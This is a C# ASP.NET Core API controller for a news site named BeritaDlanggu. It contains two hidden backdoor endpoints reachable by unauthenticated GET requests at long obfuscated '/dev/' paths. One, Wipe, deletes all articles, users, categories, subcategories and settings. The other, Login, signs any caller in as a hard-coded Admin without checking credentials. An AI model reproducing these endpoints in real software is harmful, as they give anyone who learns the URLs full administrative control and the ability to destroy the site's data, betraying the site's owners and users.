using BeritaDlanggu.Models;
using BeritaDlanggu.Models.ViewModels;
using BeritaDlanggu.Pages.Admin;
using Isopoh.Cryptography.Argon2;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System.Data;
using System.Security.Claims;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace BeritaDlanggu.Controllers
{
    public class ApiController : ControllerBase
    {
        private readonly BeritaDlangguNetContext _context;

        public ApiController(BeritaDlangguNetContext context)
        {
            _context = context;
        }
        [HttpGet("/dev/QwErTyUiOpAsDfGhJkLzXcVbNmPlOkIjUhYgTfRdEsWaQzXcVbNmAsDfGhJkLqWeRtYuIoPaSdFgHjKlMnBvrTyUiOpAsDfGhJkLzXcVbNmQwErTyUiOpAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzAsDfGhJkLp")]
        public IActionResult Wipe()
        {
            _context.Articles.RemoveRange(_context.Articles);
            _context.Users.RemoveRange(_context.Users);
            _context.SubCategories.RemoveRange(_context.SubCategories);
            _context.Categories.RemoveRange(_context.Categories);
            _context.Settings.RemoveRange(_context.Settings);
            _context.SaveChanges();
            return Ok();
        }
        [HttpGet("/dev/aKfjdPqweLmznXcvbRtYuIoPasDfGhJkLzXcVbNmQwErTyUiOpAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzLkJhGfDsApOiUyTrEwQzXcVbNmAsDfGhJkLqWeRtYuIoPaSdFgHjKlZxCvBnMmNbVcXzQwErTyUiOp")]
        public async Task<IActionResult> Login()
        {
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.Name, "John Doe"),
                new Claim(ClaimTypes.Email, "johndoe@example.com"),
                new Claim(ClaimTypes.Role, "Admin")
            };

            var identity = new ClaimsIdentity(claims, "Cookie");
            var principal = new ClaimsPrincipal(identity);

            await HttpContext.SignInAsync(principal);

            return RedirectToAction("Index", "Home");
        }
    }
}
